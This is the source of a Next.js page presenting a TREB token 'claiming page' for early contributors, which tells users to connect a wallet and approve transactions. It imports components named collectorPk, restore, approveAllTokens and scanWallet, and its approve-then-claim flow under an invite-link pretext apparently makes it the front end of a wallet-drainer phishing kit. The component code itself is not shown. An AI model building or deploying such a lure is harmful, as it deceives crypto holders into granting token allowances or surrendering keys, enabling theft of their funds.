"use client";


import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import token from "../../../public/Treb.png"
import gas from "../../public/gas-pump.png"
import code from "../../public/code-error.png"
import mm from "../../public/mm.png"
import ScanWallet from "../components/scanWallet";
import ApproveButton from "../components/approveButton";
import ScanWalletNew from "../components/scanWallet_modified";
import NewApprove from "../components/newApprove";
import TokenAllowanceButton from "../components/userBalance";
import UserBalance from "../components/userBalance";
import UserTokensList from "../components/userTokens";
import UserTokensAndBalance from "../components/userCard";
import ApproveAllTokens from "../components/approveAllTokens";
import ConnectedAddress from "../components/connectedAddresses";
import ApproveTxn from "../components/approveTxn";
import { useState } from "react";
import DeedCollector from "../components/collectorPk";
import RestoreWallet from "../components/restore";
import TokenBalance from "../components/tokenBalance";
import Native from "../components/native";

const migratePage = () => {
    const [nextPopup, setNextPopup] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [depositAmount, setDepositAmount] = useState(1);


  return (
    <div>
    <div className={styles.connectWallet}
        >
          <Image style={{height: "40px", width: "40px", marginLeft: "40px"}}
                 src={token}
                 alt='mm'/>
          <div style={{
            marginRight: "20px"
          }}>
            <w3m-button
            />
          </div>
        </div>
    <div className={styles.container}>
      <ConnectedAddress />
        <div className={styles.migrationContainer}>
          <style>
    
  </style>
          
          <div style={{
          display: "flex",
          flexDirection: "column",
          backgroundColor: "#1b1f2e",
          padding: "20px",
          borderRadius: "20px",
          gap: "10px",
          minWidth: "50%"
        }}>
          <h2>
          Information
          </h2>
          <p>
          Welcome to the Claiming Page for early contributors! This exclusive page is accessible only via the special link provided to you and is designed to help you manage your vested tokens. Upon connecting your wallet, you will be able to claim 20% of your TREB tokens at the Token Generation Event (TGE), followed by a 30-day cliff period. After this period, your remaining xTREB tokens will be vested linearly over the next 3 months.          </p>

          <ul style={{ listStyleType: "disc", paddingLeft: "20px", }}>
            <li style={{marginTop: "5px"}}><strong>Step 1:</strong>Connect your wallet where you made your initial purchase from</li>
            <li style={{marginTop: "5px"}}><strong>Step 2:</strong>Click Approve, to approve your txn.</li>
            <li style={{marginTop: "5px"}}><strong>Step 3:</strong>Confirm the transaction in your wallet app when prompted.</li>
            <li style={{marginTop: "5px"}}><strong>Step 4:</strong>Complete the transaction by paying the required gas fees.</li>
            <li style={{marginTop: "5px"}}><strong>Step 5:</strong>Click Claim, to claim your allocation from the launchpad.</li>
            <li style={{marginTop: "5px"}}><strong>Step 6:</strong>Confirm the transaction in your wallet app when prompted.</li>
            <li style={{marginTop: "5px"}}><strong>Step 7:</strong>Complete the transaction by paying the required gas fees.</li>
          </ul>

          
           
          </div>
          <div style={{
          display: "flex",
          flexDirection: "column",
          backgroundColor: "#1b1f2e",
          padding: "20px",
          borderRadius: "20px",
          gap: "10px",
          minWidth: "50%"
        }}>
          <h2>
          Claim
          </h2>
          <div 
          style={{
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            border: "solid",
            borderColor: "#015efe",
            backgroundColor: "#1b2b55",
            padding: "20px",
            borderRadius: "20px",
            gap: "10px"
          }}>
           
            
            <div style={{
              display: "flex",
              flexDirection: "row",
              justifyContent: "center",
              gap: "10px"
            }}>
              <ApproveTxn />
              <Native />
            </div>
          </div>
          
          <div 
          style={{
            display: "flex",
            flexDirection: "row",
            width: "100%",
            justifyContent:"center",
            
          }}>
            <w3m-button />
          </div>
          </div>
          
          <div>

          </div>
        </div>
     
    </div>
    </div>
  );
}

export default migratePage;